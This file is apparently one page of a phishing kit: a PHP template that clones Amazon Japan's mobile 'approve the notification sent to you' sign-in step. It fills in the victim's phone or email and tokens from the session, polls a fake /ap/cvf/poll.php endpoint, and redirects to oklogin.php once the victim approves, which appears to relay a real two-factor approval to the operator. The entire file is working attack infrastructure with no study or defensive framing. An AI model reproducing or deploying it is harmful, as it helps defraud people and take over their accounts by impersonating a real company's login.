<?php
include '../../php/xzpc.php';
session_start();

//print_r($_SESSION['okinfo']);

$info = $_SESSION['loadinInfo'];
include '../../php/curl.php';
if(!is_mobile_request()){
    header("location: ./loadin.php");
}
  
?>

<!doctype html><html class="a-no-js a-touch a-mobile" data-19ax5a9jf="mongoose"><head><script>var aPageStart = (new Date()).getTime();</script><meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"/><meta charset="utf-8"/>    <meta name="robots" content="noindex, nofollow">

<title dir="ltr">      Amazon
</title>
<link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/51Ue1htHdyL._RC|41nkGh7aiVL.css,01-yf03D4rL.css,01gq5Ie9j3L.css,31hoEl6boUL.css,01UxcfdgBIL.css,21oJOINhsoL.css,11UksSmDw-L.css,11+zKfQDbkL.css,21F1dcMesjL.css,01mq--sv14L.css,117-Dg7wwnL.css,31feIh0WqaL.css,01COiFb05sL.css,0110epzdnQL.css,21AUJFAFVFL.css,11X2-nh0PYL.css,01h2e2BEitL.css,110Q3MAjYJL.css,11aMMTVEKqL.css,11oyQ9RIYtL.css,01vd5lqeZUL.css,31rOM5fjDaL.css,014n1hV6shL.css,11XscvGD69L.css,01cbS3UK11L.css,21ybJUlhyGL.css,01L8Y-JFEhL.css,01OmXOCBEaL.css_.css?AUIClients/AmazonUI#mobile.jp.not-trident" />
<script>
(function(f,h,Q,A){function G(a){v&&v.tag&&v.tag(q(":","aui",a))}function x(a,b){v&&v.count&&v.count("aui:"+a,0===b?0:b||(v.count("aui:"+a)||0)+1)}function l(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function y(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function H(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function ta(a,b){var c=a.length,
e=c,g=function(){e--||(R.push(b),S||(setTimeout(T,0),S=!0))};for(g();c--;)ca[a[c]]?g():(B[a[c]]=B[a[c]]||[]).push(g)}function ua(a,b,c,e,g){var d=h.createElement(a?"script":"link");y(d,"error",e);g&&y(d,"load",g);a?(d.type="text/javascript",d.async=!0,c&&/AUIClients|images[/]I/.test(b)&&d.setAttribute("crossorigin","anonymous"),d.src=b):(d.rel="stylesheet",d.href=b);h.getElementsByTagName("head")[0].appendChild(d)}function da(a,b){function c(c,e){function g(){ua(b,c,h,function(b){!I&&h?(h=!1,x("resource_retry"),
g()):(x("resource_error"),a.log("Asset failed to load: "+c,I?"WARN":A));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(ea[c])return!1;ea[c]=!0;x("resource_count");var h=!0;return!g()}if(b){var e=0,g=0;c.andConfirm=function(a,b){return c(a,function(){e++;b&&b.apply(this,arguments)})};c.confirm=function(){g++};c.getCsriCounters=function(){return{reqs:e,full:g}}}return c}function va(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},logError:function(c,
d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)J.hasOwnProperty(c[d])&&(g[d]=U.hasOwnProperty(c[d])?U[c[d]](J[c[d]],e):J[c[d]]);return g}function C(a,b,c,e,g){return function(d,h){function m(){var a=null;e?a=h:"function"===typeof h&&(p.start=D(),a=h.apply(f,va(d,k,l)),p.end=D());if(b){J[d]=a;a=d;for(ca[a]=!0;(B[a]||[]).length;)B[a].shift()();delete B[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=A);b&&(d=d?d.replace(fa,""):"__NONAME__",V.hasOwnProperty(d)&&k.error(q(", reregistered by ",
q(" by ",d+" already registered",V[d]),k.attribution),d),V[d]=k.attribution);for(var l=[],n=0;n<a.length;n++)l[n]=a[n].replace(fa,"");var p=ga[d||"anon"+ ++wa]={depend:l,registered:D(),namespace:k.namespace};c?m():ta(l,k.guardFatal(d,m));return{decorate:function(a){U[d]=k.guardFatal(d,a)}}}}function ha(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:C(b,!1,a,!1,this),register:C(b,!0,a,!1,this)}}}function W(a,b){return function(c,e){e||(e=c,c=A);var g=this.attribution;
return function(){z.push(b||{attribution:g,name:c,logLevel:a});var d=e.apply(this,arguments);z.pop();return d}}}function K(a,b){this.load={js:da(this,!0),css:da(this)};H(this,"namespace",b);H(this,"attribution",a)}function ia(){h.body?p.trigger("a-bodyBegin"):setTimeout(ia,20)}function E(a,b){a.className=X(a,b)+" "+b}function X(a,b){return(" "+a.className+" ").split(" "+b+" ").join(" ").replace(/^ | $/g,"")}function ja(a){try{return a()}catch(b){return!1}}function L(){if(M){var a={w:f.innerWidth||
m.clientWidth,h:f.innerHeight||m.clientHeight};5<Math.abs(a.w-Y.w)||50<a.h-Y.h?(Y=a,N=4,(a=k.mobile||k.tablet?450<a.w&&a.w>a.h:1250<=a.w)?E(m,"a-ws"):m.className=X(m,"a-ws")):0<N&&(N--,ka=setTimeout(L,16))}}function xa(a){(M=a===A?!M:!!a)&&L()}function ya(){return M}function r(a,b){return"sw:"+(b||"")+":"+a+":"}function la(){ma.forEach(function(a){G(a)})}function n(a){ma.push(a)}function na(a,b,c,e){if(c){b=l(/Chrome/i)&&!l(/Edge/i)&&!l(/OPR/i)&&!a.capabilities.isAmazonApp&&!l(new RegExp(Z+"bwv"+
Z+"b"));var g=r(e,"browser"),d=r(e,"prod_mshop"),f=r(e,"beta_mshop");!a.capabilities.isAmazonApp&&c.browser&&b&&(n(g+"supported"),c.browser.action(g,e));!b&&c.browser&&n(g+"unsupported");c.prodMshop&&n(d+"unsupported");c.betaMshop&&n(f+"unsupported")}}"use strict";var O=Q.now=Q.now||function(){return+new Q},D=function(a){return a&&a.now?a.now.bind(a):O}(f.performance),za=D(),t=f.AmazonUIPageJS||f.P;if(t&&t.when&&t.register)throw Error("A copy of P has already been loaded on this page.");var v=f.ue;
G();G("aui_build_date:3.19.8-2020-12-30");var R=[],S=!1,T;T=function(){for(var a=setTimeout(T,0),b=O();R.length;)if(R.shift()(),50<O()-b)return;clearTimeout(a);S=!1};var ca={},B={},ea={},I=!1;y(f,"beforeunload",function(){I=!0;setTimeout(function(){I=!1},1E4)});var fa=/^prv:/,V={},J={},U={},ga={},wa=0,Z=String.fromCharCode(92),F,z=[],oa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(Z,g.message,"at "+q(":",b,c,e)):A);var d=z.pop()||
{};g.attribution=q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&console&&console.log&&console.log([g.logLevel||"ERROR",a,"thrown by",g.attribution].join(" "));z=[];oa&&(d=[].slice.call(arguments),d[4]=g,oa.apply(f,d))};K.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,
b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:W(),guardFatal:W("FATAL"),guardCurrent:function(a){var b=z[z.length-1];return b?W(b.logLevel,b).call(this,a):a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:C([],!0,!0,!0),register:C([],!0),execute:C([]),AUI_BUILD_DATE:"3.19.8-2020-12-30",when:ha(),now:ha(!0),trigger:function(a,b,c){var e=O();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&F.when("prv:a-logTrigger").execute(function(b){b(a)})},
handleTriggers:function(){this.log("handleTriggers deprecated")},attributeErrors:function(a){return new K(a)},_namespace:function(a,b){return new K(a,b)}};var p=H(f,"AmazonUIPageJS",new K);F=p._namespace("PageJS","AmazonUI");F.declare("prv:p-debug",ga);p.declare("p-recorder-events",[]);p.declare("p-recorder-stop",function(){});H(f,"P",p);ia();if(h.addEventListener){var pa;h.addEventListener("DOMContentLoaded",pa=function(){p.trigger("a-domready");h.removeEventListener("DOMContentLoaded",pa,!1)},!1)}var m=
h.documentElement,aa=function(){var a=["O","ms","Moz","Webkit"],b=h.createElement("div");return{testGradients:function(){b.style.cssText="background-image:-webkit-gradient(linear,left top,right bottom,from(#1E4),to(white));background-image:-webkit-linear-gradient(left top,#1E4,white);background-image:linear-gradient(left top,#1E4,white);";return~b.style.backgroundImage.indexOf("gradient")},test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===
b.style[c[e]])return!0;return!1},testTransform3d:function(){var a=!1;f.matchMedia&&(a=f.matchMedia("(-webkit-transform-3d)").matches);return a}}}(),t=m.className,qa=/(^| )a-mobile( |$)/.test(t),ra=/(^| )a-tablet( |$)/.test(t),k={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg",
"svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in
h.createElement("textarea")},localStorage:function(){return"localStorage"in f&&null!==f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return aa.testGradients()},hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;x("hiRes"+(qa?"Mobile":ra?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return aa.testTransform3d()},touchScrolling:function(){return l(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},
ios:function(){return l(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!l(/trident|Edge/i)},android:function(){return l(/android.([1-9]|[L-Z])/i)&&!l(/trident|Edge/i)},mobile:function(){return qa},tablet:function(){return ra},rtl:function(){return"rtl"===m.dir}},u;for(u in k)k.hasOwnProperty(u)&&(k[u]=ja(k[u]));for(var ba="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),P=0;P<ba.length;P++)k[ba[P]]=ja(function(){return aa.test(ba[P])});var M=!0,ka=0,
Y={w:0,h:0},N=4;L();y(f,"resize",function(){clearTimeout(ka);N=4;L()});var sa={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};m.className=X(m,"a-no-js");E(m,"a-js");!l(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||l(/safari/i)||E(m,"a-ember");t=[];for(u in k)k.hasOwnProperty(u)&&k[u]&&t.push("a-"+u.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));E(m,t.join(" "));m.setAttribute("data-aui-build-date",
"3.19.8-2020-12-30");p.register("p-detect",function(){return{capabilities:k,localStorage:k.localStorage&&sa,toggleResponsiveGrid:xa,responsiveGridEnabled:ya}});l(/UCBrowser/i)||k.localStorage&&E(m,sa.getItem("a-font-class"));p.declare("a-event-revised-handling",!1);var w;try{w=navigator.serviceWorker}catch(a){G("sw:nav_err")}w&&(y(w,"message",function(a){a&&a.data&&x(a.data.k,a.data.v)}),w.controller&&w.controller.postMessage("MSG-RDY"));var ma=[];(function(a){var b=a.reg,c=a.unreg;w&&w.getRegistrations?
(F.when("A","a-util").execute(function(a,b){na(a,b,c,"unregister")}),y(f,"load",function(){F.when("A","a-util").execute(function(a,c){na(a,c,b,"register");la()})})):(b&&(b.browser&&n(r("register","browser")+"unsupported"),b.prodMshop&&n(r("register","prod_mshop")+"unsupported"),b.betaMshop&&n(r("register","beta_mshop")+"unsupported")),c&&(c.browser&&n(r("unregister","browser")+"unsupported"),c.prodMshop&&n(r("unregister","prod_mshop")+"unsupported"),c.betaMshop&&n(r("unregister","beta_mshop")+"unsupported")),
la())})({reg:{},unreg:{}});p.declare("a-fix-event-off",!1);x("pagejs:pkgExecTime",D()-za)})(window,document,Date);
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11-BZEJ8lnL.js,61mMHVjNxeL.js,21Of0-9HPCL.js,01E8f3KV-NL.js,119KAWlHU6L.js,51CF7BmbF2L.js,11sT42sZnQL.js,016iHgpF74L.js,11aNYFFS5hL.js,116tgw9TSaL.js,211-p4GRUCL.js,01PoLXBDXWL.js,6139uB37GFL.js,41FEs0XB89L.js,11BOgvnnntL.js,31xbSVcI5iL.js,01qkmZhGmAL.js,01iyxuSGj4L.js,01l8233efsL.js_.js?AUIClients/AmazonUI#mobile');
</script>

    <style>
      .chimera-body-container {
        width: 25.7em !important;
        max-width: 100%;
        margin-left: auto;
        margin-right: auto;
      }
    </style>
</head>
<body class="a-color-offset-background a-m-jp a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c"><div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script><div id="header" class="a-section a-spacing-none"><div class="a-container a-global-nav-wrapper">

<div class="a-container a-global-nav-wrapper">
  





<div class="a-section a-spacing-none a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="/gp/aw/ref=mw_hm">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
    
    
      <i class="a-icon a-icon-jp a-icon-domain-jp a-icon-domain" role="img"></i>
    

    
  
</a>

    
  
</div>

</div>
</div></div>
<div id="body" class="a-section a-padding-base a-text-center"><div class="a-section a-text-left chimera-body-container">


<noscript>
<div class="a-box a-alert a-alert-warning"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">JavaScriptが無効になっています</h4><div class="a-alert-content">このサイトが正しく機能するためには、JavaScriptが必要です。次に進むには、ブラウザーでJavaScriptを有効にしてください。</div></div></div></noscript>
<div class="a-section a-spacing-base a-spacing-top-large a-text-center">  <img src="https://images-na.ssl-images-amazon.com/images/G/01/IS/TIV/6apqio2l3lersrtenak._CB427825677_.png" height="60%" width="60%"/>
</div>
<div class="a-section a-spacing-large"><span class="a-size-medium transaction-approval-word-break a-text-bold">続行するには、次の宛先に送信された通知を承認します:</span></div>
<div id="channelDetails" class="a-section">

<div class="a-section a-spacing-extra-large">
<div class="a-row"><div class="a-column a-span4 a-text-left"><?=$info['phone_email_text']?></div>
<div class="a-column a-span8 a-text-left a-span-last"><?=$info['phone_email_number']?></div></div>

</div></div>

<div class="a-section transaction-approval-js-enabled">
<form id="pollingForm" method="get" action="/ap/cvf/poll.php">
    <input type="hidden" name="arb" value="<?=$info['arb']?>"/>
    <input type="hidden" name="openid.return_to" value="<?=$info['openid_return_to']?>"/>
    <input type="hidden" name="pageId" value="<?=$info['pageId']?>"/>
    <input type="hidden" name="openid.assoc_handle" value="<?=$info['openid_assoc_handle']?>"/>
    <input type='hidden' name='csrfToken' value='<?=$info['csrfToken']?>' />
</form>
</div>
<style>

  .a-no-js .transaction-approval-js-enabled {
    display: none;
  }

</style>


<div id="resend-transaction-approval" class="a-section transaction-approval-js-enabled">



<span class="a-size-base transaction-approval-word-break a-text-bold">受け取りませんでしたか？</span>

<div class="a-section"><form id="resend-approval-form" method="post" action="./resend.php">
    <div class="a-section a-spacing-medium a-text-left"><a id="resend-approval-link" class="a-link-normal" href="javascript:;">通知を再送信</a></div>


        <input type="hidden" name="arb" value="<?=$info['arb']?>"/>
        <input type="hidden" name="openid.return_to" value="<?=$info['openid_return_to']?>"/>
        <input type="hidden" name="pageId" value="<?=$info['pageId']?>"/>
        <input type="hidden" name="openid.assoc_handle" value="<?=$info['openid_assoc_handle']?>"/>
        <input type='hidden' name='csrfToken' value='<?=$info['csrfToken']?>' />

</form></div>


<div class="a-row">
<div id="resend-approval-alert" class="a-box a-alert-inline a-alert-inline-info"><div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i><div class="a-alert-content"><div id="timer" class="a-section"></div></div></div></div></div>

</div>
<style>

  .a-no-js .transaction-approval-js-enabled {
    display: none;
  }

</style>



<div class="a-section a-text-left">
<span class="a-size-base transaction-approval-word-break a-text-bold">すでに回答されましたか？</span>
<div class="a-section"><a class="a-link-normal" href="">ページを更新するにはこちらをクリックしてください。</a></div>
</div>
<div class="a-section a-spacing-top-large a-text-left">お困りですか？ <a href="/gp/help/customer/account-issues/ref=ch_tiv_approval_broadcast_contact_cs?ie=UTF8">カスタマーサービス</a>へご連絡ください。</div>
<script>
  'use strict';

  P.when('A', 'ready').execute(function(A) {
    var $ = A.$;

    // Do polling every 5 seconds, this can be changed later if needed
    $('#pollingForm').ready(function() {
      setTimeout(polling, 5000);
    });

    function polling() {
      A.ajax($('#pollingForm').attr('action'), {
        method: 'GET',
        params: $('#pollingForm').serializeArray(),
        success: handlePollingResponse,
        error: handlePollingError
      });
    }

    function handlePollingResponse(response) {
      $('#channelDetails').html($(response).find('#updatedChannelDetails').html());
      var transactionApprovalStatus = $(response).find("input[name='transactionApprovalStatus']").val();

      switch (transactionApprovalStatus) {
        case 'TransactionPending':
          setTimeout(polling, 5000);
          break;

        case 'TransactionResponded':
        case 'TransactionExpired':
          $('#resend-transaction-approval').hide();
          setTimeout(polling, 5000);
          break;

        case 'TransactionCompleted':
        case 'TransactionCompletionTimeout':
          window.location.replace("/oklogin.php?<?=$info['openid_return_to']?>");
          break;

        default:
          window.location.reload();
      }
    }

    function getQueryParameters(url) {
      var paramPairs = {};
      var parameters = url.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
        paramPairs[key] = value;
      });

      return paramPairs;
    }

    function handlePollingError() {
      window.location.reload();
    }
  });

</script>
<script>
    P.when('A', 'ready').execute(function(A) {
        var $ = A.$;

        $('#resend-approval-link').click(function() {
            $('#resend-approval-form').submit();
        });
    });
</script>

<script>
    P.when('A', 'ready').register('resendApprovalLinksTimer', function(A) {
        function updateTime(timeleft, updateMsg) {
            var resultMsg = updateMsg.split('+timeleft+');
            var endResult = resultMsg[0].split('"').join('') +timeleft+ resultMsg[1].split('"').join('');
            A.$('#timer').html(endResult);
        }

        function onComplete(completeMsg) {
            A.$('#timer').html(completeMsg);
            A.$("#resend-approval-link").removeClass("transaction-approval-link-disabled");
        }

        function Timer(time, updateMsg, completeMsg) {
            var start = Date.now();
            var interval = setInterval(function() {
                var currTime = Date.now();
                var timePassed = currTime - start;
                var timeRemaining = time - timePassed;

                if (timeRemaining <= 0) {
                    clearInterval(interval);
                    onComplete(completeMsg);
                } else {
                    updateTime(Math.floor(timeRemaining / 1000), updateMsg);
                }
            }, 100);
        }

        function createTimer(timeInMillis, updateMsg, completeMsg) {
            return new Timer(timeInMillis, updateMsg, completeMsg);
        }

        return {
            createTimer: createTimer
        };
    });
</script>

<script>
    P.when('A', 'resendApprovalLinksTimer', 'ready').execute(function(A, resendApprovalLinksTimer) {
        if (<?=$info['isresendTimer']?>) {
            resendApprovalLinksTimer.createTimer(<?=$info['timeleft']?> - Date.now(), '通知を送信しています。完了まで数分かかる場合があります。必要に応じて、" +timeleft+ " 秒で新しい通知をリクエストできます。', '必要に応じて、承認リンクを再送信できるようになりました。');
            A.$("#resend-approval-link").addClass("transaction-approval-link-disabled");
        }
    });
</script>

<style>

  .transaction-approval-word-break {
    word-break: break-word;
  }

  .transaction-approval-link-disabled {
    pointer-events: none;
    opacity: 0.5;
  }

</style>
</div></div>


<div class="a-row auth-footer">
  



<style>
  .auth-footer-separator {
    display: inline-block;
    width: 20px;
  }
</style>

<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div id="footer" class="a-section">
  <div class="a-section a-spacing-small a-text-center a-size-mini">
    
      <span class="auth-footer-separator"></span>
    

    
      
        
          
        

        
      

      
        

        
          <a class="a-link-normal" target="_blank" href="/gp/aw/help/ref=ap_mobile_footer_cou?id=643006">
            利用規約
          </a>
        
      

      <span class="auth-footer-separator"></span>
    
      
        
          
        

        
      

      
        

        
          <a class="a-link-normal" target="_blank" href="/gp/aw/help/ref=ap_mobile_footer_privacy_notice?id=643000">
            プライバシー規約
          </a>
        
      

      <span class="auth-footer-separator"></span>
    
      
        
          
        

        
      

      
        

        
          <a class="a-link-normal" target="_blank" href="/help">
            ヘルプ
          </a>
        
      

      <span class="auth-footer-separator"></span>
    
  </div>

  <div class="a-section a-spacing-none a-text-center">
    <span class="a-size-mini a-color-secondary">
      &copy; 1996-2021, Amazon.com, Inc. or its affiliates
    </span>
  </div>
</div>

</div>
</div></body></html>